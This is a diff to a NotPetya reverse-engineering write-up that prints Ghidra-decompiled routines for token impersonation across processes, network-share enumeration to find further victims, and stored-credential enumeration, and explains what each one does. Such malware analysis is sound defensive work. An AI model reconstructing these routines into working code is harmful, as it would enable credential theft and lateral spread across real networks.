@@ -8008,7 +8008,417 @@ Referencing back to calling function we see that `param_4` is `local_4` which is
 
 Back in `FUN_10008999` we see that after some verification that the write went well and some memory cleanup the function returns.
 
-What this leaves us with is another resource that was extracted by the malware, though since we don't see anything done with it we will just remember this for now and only extract and inspect it when it is used by NotPetya (assuming it is).
+What this leaves us with is another resource that was extracted by the malware, though since we don't see anything done with it we will just remember this for now and only extract and inspect it when it is used by NotPetya (assuming it is). We will rename the function to `extract_resource_3`.
+
+### Back to Ordinal_1
+
+Back in Oridinal_1 we see that the next part is only executed when the `SeTcbPrivilege` is present.
+
+```cpp
+if ((granted_privileges & 4) != 0) {
+  null_critical_section = configure_critical_section(4,(ULONG_PTR)FUN_10007ca5,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xff);
+  uVar1 = FUN_1000875a((int)local_21c);
+  if (uVar1 != 0) {
+    ppvVar5 = local_21c;
+    param_1 = uVar1;
+    do {
+      local_8 = (int *)*ppvVar5;
+      cmd_args = (LPCWSTR)0x0;
+      param_2 = (HANDLE)0x0;
+      cmd_args = (LPCWSTR)CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10009f8e,(LPVOID)0x0,4,(LPDWORD)0x0);
+      if (cmd_args == (LPCWSTR)0x0) {
+        param_2 = (HANDLE)0x57;
+      }
+      else {
+        BVar2 = SetThreadToken(&cmd_args,local_8);
+        if (BVar2 == 0) {
+          param_2 = (HANDLE)GetLastError();
+        }
+        else {
+          dwFlags = ResumeThread(cmd_args);
+          if (dwFlags != 0xffffffff) goto LAB_10007f70;
+        }
+        CloseHandle(cmd_args);
+      }
+LAB_10007f70:
+      SetLastError((DWORD)param_2);
+      param_2 = *ppvVar5;
+      cmd_args = (LPCWSTR)0x0;
+      param_4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10007d58,&cmd_args,4,(LPDWORD)0x0);
+      if (param_4 != (HANDLE)0x0) {
+        BVar2 = SetThreadToken(&param_4,param_2);
+        if (BVar2 != 0) {
+          dwFlags = ResumeThread(param_4);
+          if (dwFlags == 0xffffffff) {
+            GetLastError();
+          }
+          else {
+            WaitForSingleObject(param_4,0xffffffff);
+          }
+        }
+        CloseHandle(param_4);
+      }
+      if (cmd_args != (LPCWSTR)0x0) {
+        possible_lock_and_wait(null_critical_section,ppvVar5,0);
+      }
+      ppvVar5 = ppvVar5 + 1;
+      param_1 = param_1 - 1;
+    } while (param_1 != 0);
+  }
+}
+```
+
+Here we first see the `null_critical_section` being initialised with `FUN_10007ca5` as the spin count function.
+
+### FUN_10007ca5
+
+```
+uint FUN_10007ca5(char *param_1,char *param_2,int param_3){
+  bool bVar1;
+  
+  bVar1 = true;
+  do {
+    if (param_3 == 0) break;
+    param_3 = param_3 + -1;
+    bVar1 = *param_1 == *param_2;
+    param_1 = param_1 + 1;
+    param_2 = param_2 + 1;
+  } while (bVar1);
+  return (uint)bVar1;
+}
+```
+
+This function appears to check the first `param_3` char's of `param_1` and `param_2` for equality and returns `1` is all are equal. We will rename the function to `first_len_equal`.
+
+### Back to Ordinal_1
+
+After initialising the critical section we see a call to `FUN_1000875a` with `local_21c` as the only argument. So far this variable has not been used yet.
+
+### FUN_1000875a
+
+```cpp
+uint FUN_1000875a(int param_1){
+  HANDLE pvVar1;
+  int iVar2;
+  BOOL BVar3;
+  uint uVar4;
+  uint unaff_EBX;
+  uint uVar5;
+  HANDLE pvStack4764;
+  uint local_1298;
+  HANDLE pvStack4756;
+  int local_1290;
+  HANDLE pvStack4748;
+  DWORD DStack4744;
+  HANDLE pvStack4740;
+  int local_1280;
+  int iStack4732;
+  undefined auStack4728 [4];
+  undefined4 local_1274;
+  HANDLE pvStack4720;
+  undefined4 auStack4672 [2];
+  DWORD DStack4664;
+  HANDLE apvStack4112 [3];
+  undefined local_1004 [4088];
+  undefined4 uStack12;
+  
+  uStack12 = 0x1000876a;
+  local_1290 = 0;
+  local_1280 = 0;
+  apvStack4112[2] = 0;
+  memset(local_1004,0,0xffc);
+  local_1298 = 0;
+  local_1274 = running_win_8_or_higher();
+  pvStack4748 = (HANDLE)CreateToolhelp32Snapshot(2,0);
+  if (pvStack4748 != (HANDLE)0xffffffff) {
+    auStack4672[0] = 0x22c;
+    iVar2 = Process32FirstW(pvStack4748,auStack4672);
+    if (iVar2 == 0) {
+      GetLastError();
+    }
+    else {
+      local_1280 = param_1 - (int)apvStack4112;
+      do {
+        local_1290 = -1;
+        pvStack4764 = (HANDLE)0x0;
+        pvStack4756 = (HANDLE)0x0;
+        pvStack4740 = OpenProcess(0x450,0,DStack4664);
+        if (pvStack4740 != (HANDLE)0x0) {
+          BVar3 = OpenProcessToken(pvStack4740,0x2000000,&pvStack4764);
+          uVar5 = unaff_EBX;
+          if ((((BVar3 != 0) &&
+               (BVar3 = GetTokenInformation(pvStack4764,TokenSessionId,&local_1290,4,&DStack4744),
+               uVar5 = unaff_EBX, BVar3 != 0)) && ((iStack4732 == 0 || (local_1290 != 0)))) &&
+             (BVar3 = DuplicateTokenEx(pvStack4764,0x2000000,(LPSECURITY_ATTRIBUTES)0x0,
+                                       SecurityImpersonation,TokenImpersonation,&pvStack4756),
+             uVar5 = unaff_EBX, BVar3 != 0)) {
+            memset(auStack4728,0,0x38);
+            BVar3 = GetTokenInformation(pvStack4756,TokenStatistics,auStack4728,0x38,&DStack4744);
+            pvVar1 = pvStack4720;
+            uVar5 = unaff_EBX;
+            if (BVar3 != 0) {
+              uVar4 = 0;
+              if (unaff_EBX != 0) {
+                do {
+                  if (apvStack4112[uVar4] == pvStack4720) goto LAB_100088f7;
+                  uVar4 = uVar4 + 1;
+                } while (uVar4 < unaff_EBX);
+              }
+              BVar3 = SetTokenInformation(pvStack4756,TokenSessionId,&local_1290,4);
+              uVar5 = unaff_EBX;
+              if (BVar3 != 0) {
+                local_1298 = local_1298 + 1;
+                uVar5 = unaff_EBX + 1;
+                *(HANDLE *)((int)apvStack4112 + local_1280 + unaff_EBX * 4) = pvStack4756;
+                apvStack4112[unaff_EBX] = pvVar1;
+              }
+            }
+          }
+LAB_100088f7:
+          CloseHandle(pvStack4764);
+          CloseHandle(pvStack4740);
+          unaff_EBX = uVar5;
+        }
+      } while ((local_1298 < 0x40) && (iVar2 = Process32NextW(pvStack4748,auStack4672), iVar2 != 0))
+      ;
+    }
+    CloseHandle(pvStack4748);
+  }
+  return local_1298;
+}
+```
+
+First we see a check for running Windows 8 or higher and afterwards we see a snapshot being created of all running processes. 
+
+Next we see a call to `Process32FirstW` to retrieve the first of the processes in the snapshot but the argument types are wrong, in particular we will retype `auStack4672` to `PROCESSENTRY32`. This also cleans up the decompilation result a fair bit.
+
+Next we see a call to [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to open the local process. The access level is requested as `0x450` which maps to `PROCESS_VM_READ` (read memory), `PROCESS_DUP_HANDLE` (duplicate handles) and `PROCESS_QUERY_INFORMATION` (retrieve certain information, token, exit code, priority class). These privileges are all assocaited with the function calls we can see further down in the function.
+
+First is a call to [OpenProcessToken](https://docs.microsoft.com/nl-nl/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken?redirectedfrom=MSDN) with access level `MAXIMUM_ALLOWED`. This gets the process token of process and stores it in `pvStack4764`.
+
+Next is a call to [GetTokeninformation](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) this gets the token information for the `TokenSessionId` token information class. Assuming that the call returned a non `NULL` token we then see a call to [DuplicateTokenEx](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex), as implies this makes a copy of the token. The following quote from MSDN describes the effect of this token duplication.
+
+> The server process can impersonate the client's security context on its local system. The server cannot impersonate the client on remote systems.
+
+The impersonation token copy is stored in `pvStack4756`.
+
+Next we see a call to [GetTokenInformation](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) again. This time to get the `TokenStatistics` information class. We will also retype `local_1278` to be of the correct `TOKEN_STATISTICS` type. 
+
+Next we see a few more checks (also using the token statistics) and if they all pass we see a call to [SetTokenInformaion](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-settokeninformation) to set the token info for the impersonation copy to that of the original process.
+
+The only thing that remains now is the references to `unaff_EBX`. Though something weird is going on with this register, adding it as a paramter does nothing not make it make more sense. It appears to be used however to skip certain process based on their token statistics.
+
+The most important thing left however is the following line.
+
+```cpp
+*(HANDLE *)((int)apvStack4112 + local_1280 + unaff_EBX * 4) = token_copy;
+```
+We know that `local_1280` is `param_1` minus `apvStack4112`. We also know that `param_1` is op type `HANDLE local_21c [64];` Finally we see that `unaff_EBX` is increased by one for each iteration of the loop over all the process. The offset of `unaff_EBX * 4` in turn reflects the size of a `HANDLE`. So effectively this token copy is stored for up to `64` running processes. Therefore we will rename this subroutine to `create_impersonation_tokens`, most likely this subroutine plays an important role in privilege escalation.
+
+### Back to Ordinal_1
+
+Back in Oridinal_1 we first rename `local_21c` to `impersonation_tokens`
+
+Next we look at the general structure of the code after the call to `create_impresination_tokens`. We clearly see a thread being strated for each of the created impersonation tokens.
+
+Going into more details we first see a simple thread being started running `FUN_10009f8e`.
+
+### FUN_10009f8e
+
+```cpp
+undefined4 FUN_10009f8e(void){
+  HANDLE ThreadHandle;
+  LPCRITICAL_SECTION p_Var1;
+  LPVOID pvVar2;
+  uint uVar3;
+  undefined4 unaff_EDI;
+  DWORD DesiredAccess;
+  BOOL OpenAsSelf;
+  HANDLE *TokenHandle;
+  short local_30 [16];
+  undefined4 local_10;
+  HANDLE local_c;
+  HANDLE local_8;
+  
+  TokenHandle = &local_8;
+  OpenAsSelf = 1;
+  DesiredAccess = 0xb;
+  local_8 = (HANDLE)0x0;
+  local_c = (HANDLE)0x0;
+  ThreadHandle = GetCurrentThread();
+  OpenAsSelf = OpenThreadToken(ThreadHandle,DesiredAccess,OpenAsSelf,TokenHandle);
+  if (OpenAsSelf != 0) {
+    DuplicateTokenEx(local_8,0x2000000,(LPSECURITY_ATTRIBUTES)0x0,SecurityImpersonation,
+                     TokenImpersonation,&local_c);
+  }
+  local_10 = critical_section_no_extra_debug;
+  p_Var1 = configure_critical_section
+                     (0x24,(ULONG_PTR)spincount_function,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
+  FUN_10007a17(p_Var1,(LPNETRESOURCEW)0x0);
+  FUN_10007b31(p_Var1);
+  lock_semaphore(p_Var1);
+  pvVar2 = (LPVOID)FUN_10006f40(local_30);
+  if (pvVar2 != (LPVOID)0x0) {
+    do {
+      uVar3 = FUN_10009987((int)local_30,(LPCWSTR)0x0,(LPCWSTR)0x0,(DWORD *)0x0);
+      if (uVar3 != 0) {
+        meth_10006f91((cls_10006f91 *)local_30,(char)p_Var1,pvVar2,unaff_EDI);
+        meth_10006f91((cls_10006f91 *)local_30,(char)local_10,0,unaff_EDI);
+      }
+      local_30[0] = 0;
+      uVar3 = FUN_10006f02(local_30);
+    } while (uVar3 != 0);
+    FUN_10006f78(pvVar2);
+  }
+  if (local_8 != (HANDLE)0x0) {
+    CloseHandle(local_8);
+    local_8 = (HANDLE)0x0;
+  }
+  if (local_c != (HANDLE)0x0) {
+    CloseHandle(local_c);
+  }
+  return 0;
+}
+```
+
+First we see see that the thread gets its own token using [GetThreadToken](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken). Next we see that this token is duplicated into an impersonation token. This is followed by the creation of a new critical section and seemly a lot of other functions calls starting with `FUN_10007a17`.
+
+### FUN_10007a17
+
+```cpp
+undefined4 FUN_10007a17(LPCRITICAL_SECTION crit_sect,LPNETRESOURCEW param_2){
+  short sVar1;
+  short *psVar2;
+  DWORD DVar3;
+  HGLOBAL _Dst;
+  int iVar4;
+  short **ppsVar5;
+  HANDLE local_14;
+  undefined4 local_10;
+  LPNETRESOURCEW local_c;
+  DWORD local_8;
+  
+  local_c = (LPNETRESOURCEW)0xffffffff;
+  local_10 = 0;
+  local_8 = 0x4000;
+  DVar3 = WNetOpenEnumW(1,0,0,param_2,&local_14);
+  if ((DVar3 == 0) && (_Dst = GlobalAlloc(0x40,local_8), _Dst != (HGLOBAL)0x0)) {
+    local_10 = 1;
+    while( true ) {
+      memset(_Dst,0,local_8);
+      DVar3 = WNetEnumResourceW(local_14,(LPDWORD)&local_c,_Dst,&local_8);
+      if (DVar3 != 0) break;
+      param_2 = (LPNETRESOURCEW)0x0;
+      if (local_c != (LPNETRESOURCEW)0x0) {
+        ppsVar5 = (short **)((int)_Dst + 0x14);
+        do {
+          iVar4 = 2;
+          if (((byte)ppsVar5[-2] & 2) == 2) {
+            FUN_10007a17(crit_sect,(LPNETRESOURCEW)(ppsVar5 + -5));
+          }
+          else {
+            psVar2 = *ppsVar5;
+            if (((psVar2 != (short *)0x0) && (*psVar2 == 0x5c)) && (psVar2[1] == 0x5c)) {
+              sVar1 = psVar2[2];
+              while ((sVar1 != 0 && (sVar1 != 0x5c))) {
+                iVar4 = iVar4 + 1;
+                sVar1 = psVar2[iVar4];
+              }
+              psVar2[iVar4] = 0;
+              possible_lock_and_wait_check_args(crit_sect,*ppsVar5 + 2,0);
+            }
+          }
+          param_2 = (LPNETRESOURCEW)((int)&param_2->dwScope + 1);
+          ppsVar5 = ppsVar5 + 8;
+        } while (param_2 < local_c);
+      }
+    }
+    if (DVar3 != 0x103) {
+      local_10 = 0;
+    }
+    GlobalFree(_Dst);
+    WNetCloseEnum(local_14);
+  }
+  return local_10;
+}
+```
+
+This function starts with a call to [WNetOpenEnumW](https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetopenenuma) which gets a list of network resources. This might be the start of an other attempt at spreading the malware. The resource requested is `param_2` which we know to be passed as `NULL` meaning the root network is returned. The list of resources is returned in `local_14`
+
+Next we see a loop over all of the resources in the returned list using [WnetEnumResourceW](https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetenumresourcew). Retyping the `_Dst` buffer to a `NETRESOURCE` buffer resolves the field offsets. 
+
+This then reveals that the remote name is retrieved for each resource. We then also see that `FUN_10007a17` is invoked if the usage field AND'ed with 2 equals 2. This is a recursive call which makes sense since network resources are shaped like a tree. The new root to look for has now been passed as the current resource that was found. This also means that the usage that was checked for is probably a type of root node. We could loop it up but that's probably not required. Instead we look at the else branch.
+
+The else branch stars by checking if the remote name starts with `\\` as is the case for network shares. Next is a loop over the remote name to make sure that there are no `NUL` characters in it and no more `\` characters. If this check passes the address is null terminated and the remote name without the leading `\\` is passed to `possible_lock_and_wait_check_args`.
+
+The remainder of this function just more cleanup and management of the loop over all the resources. It seems as if this function is meant to find more victims via network shares. This also makes sense in combination with the impersonation tokens although we haven't seen them being used. Either way we will rename the function to `find_victims_via_shares`.
+
+### Back to FUN_10009f8e
+
+The function directly after 1 `find_victims_via_shares` is `FUN_10007b31` which we will investigate next.
+
+### FUN_10007b31
+
+```cpp
+int FUN_10007b31(LPCRITICAL_SECTION param_1){
+  int iVar1;
+  int iVar2;
+  ushort *puVar3;
+  int iVar4;
+  ushort *puVar5;
+  ushort *puVar6;
+  uint local_14;
+  int local_10;
+  int local_c;
+  uint local_8;
+  
+  local_c = 0;
+  local_8 = 0;
+  iVar2 = CredEnumerateW(0,0,&local_8,&local_c);
+  if (iVar2 != 0) {
+    local_14 = 0;
+    if (local_8 != 0) {
+      do {
+        iVar1 = *(int *)(local_c + local_14 * 4);
+        puVar6 = *(ushort **)(iVar1 + 8);
+        if (puVar6 == (ushort *)0x0) {
+LAB_10007bdb:
+          if (*(int *)(iVar1 + 4) == 2) goto LAB_10007be1;
+        }
+        else {
+          local_10 = 8;
+          puVar5 = &DAT_100140bc;
+          puVar3 = puVar6;
+          do {
+            if (*puVar3 != *puVar5) {
+              iVar4 = (-(uint)(*puVar3 < *puVar5) & 0xfffffffe) + 1;
+              goto LAB_10007b9f;
+            }
+            puVar3 = puVar3 + 1;
+            puVar5 = puVar5 + 1;
+            local_10 = local_10 + -1;
+          } while (local_10 != 0);
+          iVar4 = 0;
+LAB_10007b9f:
+          if ((iVar4 != 0) || (puVar6 = puVar6 + 8, *(int *)(iVar1 + 4) != 1)) goto LAB_10007bdb;
+          if ((*(int *)(iVar1 + 0x30) != 0) && (*(int *)(iVar1 + 0x1c) != 0)) {
+            handle_colon_arg(*(short **)(iVar1 + 0x30),*(short **)(iVar1 + 0x1c),0);
+          }
+LAB_10007be1:
+          possible_lock_and_wait_check_args(param_1,(short *)puVar6,0);
+        }
+        local_14 = local_14 + 1;
+      } while (local_14 < local_8);
+    }
+    CredFree(local_c);
+  }
+  return iVar2;
+}
+```
+
+
+
+
 
 
 
